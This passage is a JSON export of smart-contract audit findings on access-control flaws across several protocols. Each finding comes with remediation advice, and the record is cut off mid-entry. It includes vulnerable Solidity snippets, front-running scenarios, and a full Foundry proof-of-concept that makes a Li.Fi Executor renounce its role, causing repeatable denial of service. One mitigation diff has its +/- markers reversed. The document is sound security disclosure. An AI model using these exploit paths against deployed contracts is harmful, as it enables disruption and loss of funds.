{
  "tag": "Access Control",
  "count": 49,
  "metadata": {
    "totalResults": 49,
    "totalPages": 1
  },
  "last_rateLimit": {
    "limit": 20,
    "remaining": 17,
    "reset": 1771760940
  },
  "findings": [
    {
      "id": "64924",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 3,
      "protocol_id": "3584",
      "title": "[M-03] Incompatibility with Account Abstraction and Multisigs due to enforced address symmetry in cross chain unstaking",
      "content": "\n\n* `token/wiTRY/crosschain/UnstakeMessenger.sol` [# L120](https://github.com/code-423n4/2025-11-brix-money/blob/main/src/token/wiTRY/crosschain/UnstakeMessenger.sol# L120)\n* `token/wiTRY/crosschain/wiTryVaultComposer.sol` [# L266](https://github.com/code-423n4/2025-11-brix-money/blob/main/src/token/wiTRY/crosschain/wiTryVaultComposer.sol# L266)\n\n### Finding description\n\nThe `UnstakeMessenger` contract on the Spoke chain handles the initiation of cross chain unstaking requests. The `unstake` function constructs the cross chain payload but fails to allow the caller to specify a destination recipient address. It explicitly hardcodes the `user` field (the recipient of the funds on the Hub chain) to be `msg.sender`.\n```\n\nfunction unstake(uint256 returnTripAllocation) external payable nonReentrant returns (bytes32 guid) {\n    ...\n    bytes memory extraOptions = OptionsBuilder.newOptions();\n\n    UnstakeMessage memory message = UnstakeMessage({\n@>      user: msg.sender,\n        extraOptions: extraOptions\n    });\n\n    bytes memory payload = abi.encode(MSG_TYPE_UNSTAKE, message);\n    ...\n}\n```\n\nOn the Hub chain, the `wiTryVaultComposer` receives this message and uses the `user` field as the destination for the withdrawn assets.\n```\n\nfunction _handleUnstake(Origin calldata _origin, bytes32 _guid, IUnstakeMessenger.UnstakeMessage memory unstakeMsg)\n    internal\n    virtual\n{\n    address user = unstakeMsg.user;\n    ...\n    SendParam memory _sendParam = SendParam({\n        dstEid: _origin.srcEid,\n@>      to: bytes32(uint256(uint160(user))),\n        amountLD: assets,\n        minAmountLD: assets,\n        extraOptions: options,\n        composeMsg: \"\",\n        oftCmd: \"\"\n    });\n\n    _send(ASSET_OFT, _sendParam, address(this));\n    ...\n}\n```\n\nThis enforced address symmetry assumes that the user controls the same address on both chains. This assumption fails for Smart Contract Wallets, Account Abstraction (AA) wallets, and Multisigs (e.g., Gnosis Safe), as their addresses often differ across chains due to nonce mismatches.\n\n### Impact\n\nUsers with Account Abstraction (AA) wallets or Multisigs will permanently lose their assets.\n\n### Recommended mitigation steps\n\nUpdate the `unstake` function in `UnstakeMessenger` to accept an optional `_recipient` parameter. This allows users to specify the destination address on the Hub chain.\n```\n\n- function unstake(uint256 returnTripAllocation, address _recipient) external payable nonReentrant returns (bytes32 guid) {\n+ function unstake(uint256 returnTripAllocation) external payable nonReentrant returns (bytes32 guid) {\n    if (peers[hubEid] == bytes32(0)) revert HubNotConfigured();\n    if (returnTripAllocation == 0) revert InvalidReturnTripAllocation();\n\n    address targetUser = _recipient == address(0) ? msg.sender : _recipient;\n\n    bytes memory extraOptions = OptionsBuilder.newOptions();\n\n    UnstakeMessage memory message = UnstakeMessage({\n-        user: msg.sender,\n+        user: targetUser,\n        extraOptions: extraOptions\n    });\n\n    bytes memory payload = abi.encode(MSG_TYPE_UNSTAKE, message);\n    ...\n}\n```\n\n### Proof of Concept\n\nAdd this PoC to `UnstakeMessenger.t.sol`:\n\n[View detailed Proof of Concept](https://code4rena.com/audits/2025-11-brix-money/submissions/S-624)\n\nLogs:\n```\n\nforge test --match-test test_POC_HardcodedRecipient_Prevents_Multisig_Migration -vvv\n[⠆] Compiling...\n[⠆] Compiling 1 files with Solc 0.8.20\n[⠰] Solc 0.8.20 finished in 18.04s\nCompiler run successful with warnings:\nWarning (2018): Function state mutability can be restricted to view\n   --> test/crosschainTests/crosschain/UnstakeMessenger.t.sol:246:5:\n    |\n246 |     function test_Constructor_InitializesCorrectly() public {\n    |     ^ (Relevant source part starts here and spans across multiple lines).\n\nRan 1 test for test/crosschainTests/crosschain/UnstakeMessenger.t.sol:UnstakeMessengerTest\n[PASS] test_POC_HardcodedRecipient_Prevents_Multisig_Migration() (gas: 491951)\nLogs:\n  -------------------------------------------------------\n  [POC] Testing Forced Address Symmetry Vulnerability\n  -------------------------------------------------------\n  Sender (Spoke Chain):     0xE8B00b2fe39c1A1CF00DE5de5C14ac3A8db2B7eE\n  Desired Recipient (Hub):  0x0eF6C1d0dbEd6836E84DF31f29B33C4EBDf71B4a\n  Actual Forced Recipient:  0xE8B00b2fe39c1A1CF00DE5de5C14ac3A8db2B7eE\n  -------------------------------------------------------\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 2.66ms (816.20µs CPU time)\n\nRan 1 test suite in 59.29ms (2.66ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\n---\n\n",
      "summary": "\nThis bug report is about a contract called `UnstakeMessenger` which is used to initiate cross chain unstaking requests. The `unstake` function in this contract does not allow the caller to specify a destination recipient address, but instead hardcodes it to be the same as the sender's address. This can cause issues for users with Account Abstraction (AA) wallets or Multisigs, as their addresses may differ across chains. This can result in permanent loss of assets for these users. To fix this, the `unstake` function should be updated to accept an optional `_recipient` parameter which allows users to specify the destination address on the Hub chain. A proof of concept has been provided to demonstrate this vulnerability. ",
      "report_date": {},
      "contest_prize_txt": "23000",
      "contest_link": "https://code4rena.com/reports/2025-11-brix-money",
      "sponsor_name": "Brix Money",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2025-11-brix-money",
      "github_link": "https://code4rena.com/audits/2025-11-brix-money/submissions/F-293",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "539",
      "slug": "m-03-incompatibility-with-account-abstraction-and-multisigs-due-to-enforced-address-symmetry-in-cross-chain-unstaking-code4rena-brix-money-brix-money-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Brix Money",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Brix Money",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Lending"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Leveraged Farming"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Derivatives"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Indexes"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "62469",
      "kind": "MARKDOWN",
      "auditfirm_id": "23",
      "impact": "LOW",
      "finders_count": 1,
      "protocol_id": "1179",
      "title": "Remove unnecessary ETH handling logic for maker asset",
      "content": "##### Description\nIn the [`callExecutor()`](https://github.com/BarterLab/argon/blob/f653d58132124854db42d2bd93d0c6b91da2c398/contracts/InchFusionBarterResolver.sol#L93-L123) function, there's logic that checks if the maker asset is ETH and skips token transfer:\n\n```solidity\nif (makerAsset.get() != address(0) && \n    makerAsset.get() != address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE)\n   ) {\n    IERC20(makerAsset.get()).safeTransfer(address(executor), makingAmount);\n}\n```\n\nThis logic appears to be leftover code from UniswapX solver implementation and is not needed in the context of 1inch Fusion orders.\n<br/>\n##### Recommendation\nWe recommend removing unnecessary logic.\n\n---\n    ",
      "summary": "",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "",
      "sponsor_name": null,
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Barter%20DAO/InchFusionBarterResolver/README.md#3-remove-unnecessary-eth-handling-logic-for-maker-asset",
      "github_link": "",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "",
      "slug": "remove-unnecessary-eth-handling-logic-for-maker-asset-mixbytes-none-barter-dao-markdown",
      "firm_name": "MixBytes",
      "firm_logo_square": "mixbytes_square.png",
      "protocol_name": "Barter DAO",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "MixBytes",
        "logo_square": "mixbytes_square.png"
      },
      "protocols_protocol": {
        "name": "Barter DAO",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "0x"
          }
        },
        {
          "tags_tag": {
            "title": "1/64 Rule"
          }
        },
        {
          "tags_tag": {
            "title": "51% Attack"
          }
        },
        {
          "tags_tag": {
            "title": "API Inconsistency"
          }
        },
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "61887",
      "kind": "MARKDOWN",
      "auditfirm_id": "37",
      "impact": "LOW",
      "finders_count": 3,
      "protocol_id": "3359",
      "title": "Missing Validation for Zero `success_percentage` in DAO Creation",
      "content": "**Update**\nThe team addressed in: `a429b0c9ce78be9294a27934e1a184261b88917a`, `2255f30c7f9559ce225b407c26f6d816325d78f3`with the following explanation:\n\n> Second commit (2255f30c7f9559ce225b407c26f6d816325d78f3) contains constants.fc update.\n\n**File(s) affected:**`contracts/factory.fc`, `contracts/master.fc`\n\n**Description:** In both the `factory`’s `op::create_master` and the `master`’s `op::change_success_percentage`, the code checks that `success_percentage` does not exceed 100%, but it does not enforce a minimum above zero.\n\nGenerally, we should not expect a proposal to pass with zero votes.\n\n**Recommendation:** Add a validation such as `throw_if(error::value_too_low, success_percentage == 0)` in both `op::create_master` and `op::change_success_percentage` to ensure `success_percentage >= 1`.",
      "summary": "",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://certificate.quantstamp.com/full/xdao/2670863d-2e1c-42e6-a15c-5572dd4fef85/index.html",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 3.666666666666667,
      "general_score": 4,
      "source_link": "https://certificate.quantstamp.com/full/xdao/2670863d-2e1c-42e6-a15c-5572dd4fef85/index.html",
      "github_link": "",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "",
      "slug": "missing-validation-for-zero-success_percentage-in-dao-creation-quantstamp-xdao-markdown",
      "firm_name": "Quantstamp",
      "firm_logo_square": "quantstamp_square.png",
      "protocol_name": "XDAO",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Quantstamp",
        "logo_square": "quantstamp_square.png"
      },
      "protocols_protocol": {
        "name": "XDAO",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        },
        {
          "tags_tag": {
            "title": "Account Abstraction"
          }
        },
        {
          "tags_tag": {
            "title": "Auditing and Logging"
          }
        }
      ]
    },
    {
      "id": "61744",
      "kind": "MARKDOWN",
      "auditfirm_id": "37",
      "impact": "MEDIUM",
      "finders_count": 3,
      "protocol_id": "3347",
      "title": "Missing Access Control Allows Users to Bypass Fees",
      "content": "**Update**\nMarked as \"Fixed\" by the client. Addressed in: `70df9ec462d46988a63faf402ae481dc04f4f80f`. The client provided the following explanation:\n\n> We've made the preferred fee setup owner only.\n\n![Image 19: Alert icon](https://certificate.quantstamp.com/full/token-ops-3-airdrop/23f2fc7c-6c0e-4ac7-8d7c-95165c6b01b7/static/media/info-icon-alert.3c9578483b1cf3181c9bfb6fec7dc641.svg)\n\n**Update**\nThe client changed the approach to use role-based access control instead of the owner in commit `2c06b09e5af4f3ad621af0addd00db169601b670`.\n\n![Image 20: Alert icon](https://certificate.quantstamp.com/full/token-ops-3-airdrop/23f2fc7c-6c0e-4ac7-8d7c-95165c6b01b7/static/media/info-icon-alert.3c9578483b1cf3181c9bfb6fec7dc641.svg)\n\n**Update**\nThe function `setPreferredFeeType()` was later removed in a0082c3855bad17bca37cbf04ad40e99f64c4951.\n\n**File(s) affected:**`contracts/factory/TokenOpsMerkleDistributorFactory.sol`\n\n**Description:** The `setPreferredFeeType()` function in the `TokenOpsMerkleDistributorFactory` contract allows any caller to change the preferred fee type for any campaign creator. This opens the door to frontrunning attacks, where an attacker could modify the fee type just before a new `TokenOpsMerkleDistributor` is deployed. If the selected fee type has no corresponding value set, the resulting fee could unintentionally be zero. Since the fee type and value are stored as immutable variables in the distributor contract, this would require a re-deployment to correct and result in a loss of fees for the fee collector.\n\n**Exploit Scenario:**\n\n1.   Alice configures `DistributionToken` as the preferred fee type with a 10% fee, leaving `gasFee` equal to zero.\n2.   Bob calls `setPreferredFeeType()` with Alice as `campaignCreator` and sets their preferred fee type from `DistributionToken` to `Gas`. \n3.   Alice does not realize the change (or gets front-ran by Bob) and deploys the airdrop contract with the configured 0% Gas fee.\n4.   Alice cannot change the fee configuration of the deployed airdrop contract, so they need to potentially claw back any transferred tokens and redeploy the airdrop contract.\n\n**Recommendation:** We recommend allowing only the owner or the campaing creator to have access to this function.",
      "summary": "\nThe client reported a bug where anyone can change the preferred fee type for a campaign creator in the `TokenOpsMerkleDistributorFactory` contract. This could lead to a loss of fees for the fee collector if the selected fee type has no corresponding value set. An attacker could exploit this by changing the fee type just before a new `TokenOpsMerkleDistributor` is deployed. The recommended solution is to only allow the owner or the campaign creator to have access to this function. The bug has been marked as fixed and the approach has been changed to use role-based access control instead of the owner. The function `setPreferredFeeType()` has also been removed in a later commit. ",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "https://certificate.quantstamp.com/full/token-ops-3-airdrop/23f2fc7c-6c0e-4ac7-8d7c-95165c6b01b7/index.html",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://certificate.quantstamp.com/full/token-ops-3-airdrop/23f2fc7c-6c0e-4ac7-8d7c-95165c6b01b7/index.html",
      "github_link": "",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "",
      "slug": "missing-access-control-allows-users-to-bypass-fees-quantstamp-tokenops-3-airdrop-markdown",
      "firm_name": "Quantstamp",
      "firm_logo_square": "quantstamp_square.png",
      "protocol_name": "TokenOps 3 - Airdrop",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Quantstamp",
        "logo_square": "quantstamp_square.png"
      },
      "protocols_protocol": {
        "name": "TokenOps 3 - Airdrop",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "58248",
      "kind": "MARKDOWN",
      "auditfirm_id": "16",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "1389",
      "title": "[H-04] Lack of access control on tSQD's `registerTokenOnL2`",
      "content": "## Severity\n\n**Impact**: High, malicious attacker can set L2 custom address to different address to break the bridge token.\n\n**Likelihood**: Medium, attacker can front-ran the `registerTokenOnL2` to break the bridge token.\n\n## Description\n\ntSQD is designed so that it can be bridged from Ethereum (L1) to Arbitrum (L2) via Arbitrum’s generic-custom gateway.\nHowever, the `registerTokenOnL2` function, which sets the L2 token address via `gateway.registerTokenToL2`, is not currently restricted.\n\n```solidity\n  function registerTokenOnL2(\n    address l2CustomTokenAddress,\n    uint256 maxSubmissionCostForCustomGateway,\n    uint256 maxSubmissionCostForRouter,\n    uint256 maxGasForCustomGateway,\n    uint256 maxGasForRouter,\n    uint256 gasPriceBid,\n    uint256 valueForGateway,\n    uint256 valueForRouter,\n    address creditBackAddress\n  ) public payable {\n    require(!shouldRegisterGateway, \"ALREADY_REGISTERED\");\n    shouldRegisterGateway = true;\n\n    gateway.registerTokenToL2{value: valueForGateway}(\n      l2CustomTokenAddress, maxGasForCustomGateway, gasPriceBid, maxSubmissionCostForCustomGateway, creditBackAddress\n    );\n\n    router.setGateway{value: valueForRouter}(\n      address(gateway), maxGasForRouter, gasPriceBid, maxSubmissionCostForRouter, creditBackAddress\n    );\n\n    shouldRegisterGateway = false;\n  }\n```\n\nAn attacker can front-run the `registerTokenOnL2` and put an incorrect address for `l2CustomTokenAddress` to break the bridge token. Once it is called, the L2 token cannot be changed inside the gateway.\n\n## Recommendations\n\nUse the Ownable functionality inside tSQD and restrict `registerTokenOnL2` so that it can only be called by the owner/admin, as suggested by the Arbitrum bridge token design.",
      "summary": "\nThis bug report highlights a potential issue in the tSQD system, where an attacker could change the address of the L2 token and cause problems with the bridge token. This could have a high impact and is likely to occur. The `registerTokenOnL2` function is currently not restricted, allowing an attacker to front-run and input an incorrect address for the L2 token. This would result in the bridge token being broken and unable to be changed within the gateway. The recommendation is to use the Ownable functionality and restrict the `registerTokenOnL2` function to only be called by the owner/admin, as suggested by the design of the Arbitrum bridge token.",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "",
      "sponsor_name": null,
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 2,
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Subsquid-security-review.md",
      "github_link": "",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "",
      "slug": "h-04-lack-of-access-control-on-tsqds-registertokenonl2-pashov-audit-group-none-subsquid-markdown",
      "firm_name": "Pashov Audit Group",
      "firm_logo_square": "Pashov_square.png",
      "protocol_name": "Subsquid",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Pashov Audit Group",
        "logo_square": "Pashov_square.png"
      },
      "protocols_protocol": {
        "name": "Subsquid",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "55719",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 5,
      "protocol_id": "2515",
      "title": "[M-02] Anyone can DOS `handleReallocation` over and over",
      "content": "\n\n<https://github.com/code-423n4/2025-03-nudgexyz/blob/main/src/campaign/NudgeCampaign.sol# L164-L233>\n\n<https://github.com/code-423n4/2025-03-nudgexyz/blob/main/src/campaign/NudgePointsCampaigns.sol# L126-L178>\n\n<https://github.com/code-423n4/2025-03-nudgexyz/blob/main/src/campaign/NudgeCampaignFactory.sol# L4>\n\n### Finding description and impact\n\nLi.Fi’s Executor contract is granted `SWAP_CALLER_ROLE`. The function `handleReallocation` is used inside the protocol to notify about user’s reallocation and can only be called by address that has `SWAP_CALLER_ROLE`. The intention of the protocol is to use the executor’s functions so that executor swaps assets and then calls `handleReallocation` inside `NudgeCampaign` / `NudgePointsCampaign` contract.\n\nHowever, the Executor contract that has as a `SWAP_CALLER_ROLE` can be used by anyone (its functions do not have access control restrictions which is expected), anyone can call function `swapAndExecute`. This means that **any user** can call the `swapAndExecute` function and instruct the `Executor` to call **arbitrary functions** on other contracts.\n\nAs a result, an attacker can use the `Executor` to call `renounceRole` on the `NudgeCampaignFactory` contract, causing the `Executor` to lose its `SWAP_CALLER_ROLE`. This leads to DOS of every next `handleReallocation` call from Executor. Admin has to `grantRole` again to Executor contract, but user can repeat the process of `renouncingRole` using Executor.\n\nExecutor function that can be called is [here](https://github.com/lifinance/contracts/blob/b8c966aad30407b3f579723847057729549fd353/src/Periphery/Executor.sol# L105-L126).\n\n### Proof of Concept\n\nIn order to POC to work, we must copy and paste contracts related to Executor and ERC20Proxy (the contract used by Executor) from official Li Fi’s contract repository so that we can use Executor inside our tests.\n\nI’ve put LiFi’s contracts inside campaign directory in new folders created by me; Errors, Helpers, Interfaces, Libraries and Periphery:\n```\n\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.28;\n\nimport { Test } from \"forge-std/Test.sol\";\nimport { Math } from \"@openzeppelin/contracts/utils/math/Math.sol\";\nimport { ERC20 } from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport { NudgeCampaign } from \"../campaign/NudgeCampaign.sol\";\nimport { NudgeCampaignFactory } from \"../campaign/NudgeCampaignFactory.sol\";\nimport { INudgeCampaign, IBaseNudgeCampaign } from \"../campaign/interfaces/INudgeCampaign.sol\";\nimport \"../mocks/TestERC20.sol\";\nimport { console } from \"forge-std/console.sol\";\nimport { Executor } from \"../campaign/Periphery/Executor.sol\";\nimport { ERC20Proxy } from \"../campaign/Periphery/ERC20Proxy.sol\";\nimport { LibSwap } from \"../campaign/Libraries/LibSwap.sol\";\nimport { TestUSDC } from \"../mocks/TestUSDC.sol\";\n\ncontract TestDOSReallocation is Test {\n  using Math for uint256;\n\n  NudgeCampaign private campaign;\n  NudgeCampaignFactory private factory;\n  TestERC20 private targetToken;\n  TestERC20 private rewardToken;\n\n  address owner = address(1);\n  address alice = address(11);\n  address bob = address(12);\n  address campaignAdmin = address(13);\n  address nudgeAdmin = address(14);\n  address treasury = address(15);\n  address swapCaller = address(16);\n  address operator = address(17);\n  address alternativeWithdrawalAddress = address(18);\n  bytes32 public constant SWAP_CALLER_ROLE = keccak256(\"SWAP_CALLER_ROLE\");\n  uint16 constant DEFAULT_FEE_BPS = 1000; // 10%\n  uint32 constant HOLDING_PERIOD = 7 days;\n  uint256 constant REWARD_PPQ = 2e13;\n  uint256 constant INITIAL_FUNDING = 100_000e18;\n  uint256 constant PPQ_DENOMINATOR = 1e15;\n  address constant NATIVE_TOKEN = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;\n  address badActor = address(0xBAD);\n  Executor executor;\n  address executorOwner = address(19);\n  ERC20Proxy erc20Proxy;\n\n  function setUp() public {\n    vm.startPrank(owner);\n    //deploy erc20 proxy which is part of Li Fi protocol\n    erc20Proxy = new ERC20Proxy(owner);\n    vm.stopPrank();\n    // Deploy tokens\n    targetToken = new TestERC20(\"Target Token\", \"TT\");\n    rewardToken = new TestERC20(\"Reward Token\", \"RT\");\n\n    //deploy executor which is part of li fi protocol\n    executor = new Executor(address(erc20Proxy), executorOwner);\n    swapCaller = address(executor);\n    console.log(address(executor));\n\n    // Deploy factory with roles\n    factory = new NudgeCampaignFactory(treasury, nudgeAdmin, operator, address(executor));\n\n    vm.startPrank(owner);\n    //set executor as authorized caller as in Li Fi protocol\n    erc20Proxy.setAuthorizedCaller(address(executor), true);\n    vm.stopPrank();\n\n    // Fund test contract and approve factory\n    rewardToken.mintTo(INITIAL_FUNDING, address(this));\n    rewardToken.approve(address(factory), INITIAL_FUNDING);\n\n    // Deploy and fund campaign\n    campaign = NudgeCampaign(\n      payable(\n        factory.deployAndFundCampaign(\n          HOLDING_PERIOD,\n          address(targetToken),\n          address(rewardToken),\n          REWARD_PPQ,\n          campaignAdmin,\n          0, // start immediately\n          alternativeWithdrawalAddress,\n          INITIAL_FUNDING,\n          1 // uuid\n        )\n      )\n    );\n\n    // Setup swapCaller\n    deal(address(targetToken), swapCaller, INITIAL_FUNDING);\n    vm.prank(swapCaller);\n    targetToken.approve(address(campaign), type(uint256).max);\n  }\n\n  function test_DOSReallocation() public {\n    vm.deal(badActor, 10 ether);\n    vm.startPrank(badActor);\n\n    //deploy test usdc contract - this can be custom contract deployed by the attacker\n    TestUSDC testUsdc = new TestUSDC(\"A\", \"B\");\n\n    testUsdc.mintTo(1 ether, badActor);\n    testUsdc.approve(address(executor), 1);\n    testUsdc.approve(address(erc20Proxy), 1);\n\n    bytes memory renounceRoleCallData =\n      abi.encodeWithSignature(\"renounceRole(bytes32,address)\", SWAP_CALLER_ROLE, address(executor));\n\n    LibSwap.SwapData memory sd1 = LibSwap.SwapData(\n      //callTo:\n      address(factory),\n      //approveTo:\n      address(testUsdc),\n      //sendingAssetId:\n      address(testUsdc),\n      //receivingAssetId:\n      address(testUsdc),\n      //fromAmount:\n      1,\n      //callData:\n      renounceRoleCallData,\n      //requiresDeposit:\n      false\n    );\n\n    LibSwap.SwapData[] memory swapDataArray = new LibSwap.SwapData[](1);\n    swapDataArray[0] = sd1;\n\n    bytes32 transactionId = bytes32(uint256(1));\n    address transferredAssetId = address(testUsdc);\n    address receiver = address(badActor);\n    uint256 amount = 1;\n    //attacker orders executor to execute renounceRole function on factory contract, leading to loss of role for executor\n    // all of the future handleReallocations will revert, unless Nudge Admin will grant SWAP_CALLER_ROLE to executor\n    //but the attacker can repeat this process indefinitely\n    executor.swapAndExecute(transactionId, swapDataArray, address(testUsdc), payable(receiver), amount);\n    vm.stopPrank();\n\n    assert(!factory.hasRole(SWAP_CALLER_ROLE, address(executor)));\n  }\n}\n```\n\n### Recommended mitigation steps\n\nDisallow `Executor` to renounce their role, or store executor as address and only verify that `msg.sender` is executor; which would make it impossible to renounce the role from the executor.\n\n**raphael (Nudge.xyz) confirmed**\n\n---\n\n",
      "summary": "\nThe bug report discusses a vulnerability in the code of a project called Nudge.xyz. The issue arises from the fact that the Executor contract, which is responsible for swapping assets and calling a specific function, can be used by anyone to call arbitrary functions on other contracts. This means that an attacker can use the Executor to renounce its role, causing it to lose its permissions and leading to a denial of service attack. The report also includes a proof of concept for the vulnerability. The recommended mitigation steps include disallowing the Executor to renounce its role or storing the Executor as an address to prevent this type of attack. The project team has confirmed the issue and is working on a solution.",
      "report_date": {},
      "contest_prize_txt": "20000",
      "contest_link": "https://code4rena.com/reports/2025-03-nudgexyz",
      "sponsor_name": "Nudge.xyz",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2025-03-nudgexyz",
      "github_link": "https://code4rena.com/audits/2025-03-nudgexyz/submissions/F-14",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "496",
      "slug": "m-02-anyone-can-dos-handlereallocation-over-and-over-code4rena-nudgexyz-nudgexyz-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Nudge.xyz",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Nudge.xyz",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "45092",
      "kind": "MARKDOWN",
      "auditfirm_id": "16",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "2083",
      "title": "[C-04] Lack of access control in `ResetSystem::resetGame()`",
      "content": "## Severity\n\n**Impact:** High\n\n**Likelihood:** High\n\n## Description\n\nThe `resetGame` function in the `ResetSystem` contract does not implement any form of access control, allowing anyone to call it. This creates a severe vulnerability, as any unauthorized user can reset the entire game state, leading to potential loss of progress and disruption of gameplay.\n\nAdditionally, in the configuration file `mud.config.ts`, the `openAccess` flag for several subsystems, including `ResetClearLoopSubsystem`, is correctly set to `false`, but this access control has not been applied to the `ResetSystem` contract. The absence of a modifier enforcing access restrictions exacerbates the issue.\n\nHere is the code where access control is missing:\n\n```solidity\nfunction resetGame() public {\n    IWorld world = IWorld(_world());\n    world.Empires__clearLoop();\n    P_GameConfigData memory config = P_GameConfig.get();\n\n    P_GameConfig.setGameOverBlock(block.number + config.nextGameLengthTurns * config.turnLengthBlocks);\n    P_GameConfig.setGameStartTimestamp(block.timestamp);\n    createPlanets(); // Planet and Empire tables are reset to default values\n    LibShieldEater.initialize(); // ShieldEater relocated, charge reset, and destination set\n    initPrice(); // Empire.setPointPrice and OverrideCost tables are reset to default values\n    Turn.set(block.number + config.turnLengthBlocks, EEmpire.Red, 1);\n}\n```\n\nThis lack of control could lead to a malicious actor resetting the game at any time, which could have disastrous consequences, especially in a competitive or high-stakes environment.\n\n## Recommendations\n\n- **Implement access control modifiers**: Add a restrictive modifier such as `onlyOwner` or `onlyAdmin` to ensure that only authorized users can call the `resetGame` function.\n- **Update configuration**: Ensure that `openAccess` in the `mud.config.ts` file is correctly applied and that access control is enforced at the contract level as well.\n\n```diff\nexport const worldInput = {\n  namespace: \"Empires\",\n  systems: {\n    UpdateEmpiresSubsystem: { openAccess: false },\n    UpdateAcidSubsystem: { openAccess: false },\n    UpdateMagnetsSubsystem: { openAccess: false },\n    UpdatePriceSubsystem: { openAccess: false },\n    UpdateShieldEaterSubsystem: { openAccess: false },\n    ResetClearLoopSubsystem: { openAccess: false },\n+   ResetSystem: { openAccess: false },\n  },\n```",
      "summary": "\nThis bug report highlights a vulnerability in the `resetGame` function of the `ResetSystem` contract. This function does not have any restrictions on who can call it, which means anyone can reset the game state. This could lead to loss of progress and disruption of gameplay. The report suggests implementing access control modifiers and updating the configuration file to prevent unauthorized access to the function. ",
      "report_date": {},
      "contest_prize_txt": "",
      "contest_link": "",
      "sponsor_name": null,
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Primodium-security-review_2024-10-02.md",
      "github_link": "",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "",
      "slug": "c-04-lack-of-access-control-in-resetsystemresetgame-pashov-audit-group-none-primodium_2024-10-02-markdown",
      "firm_name": "Pashov Audit Group",
      "firm_logo_square": "Pashov_square.png",
      "protocol_name": "Primodium_2024-10-02",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Pashov Audit Group",
        "logo_square": "Pashov_square.png"
      },
      "protocols_protocol": {
        "name": "Primodium_2024-10-02",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Access Control"
          }
        }
      ]
    },
    {
      "id": "44218",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "MEDIUM",
      "finders_count": 2,
      "protocol_id": "1959",
      "title": "M-3: Attacker can revoke any user from a market",
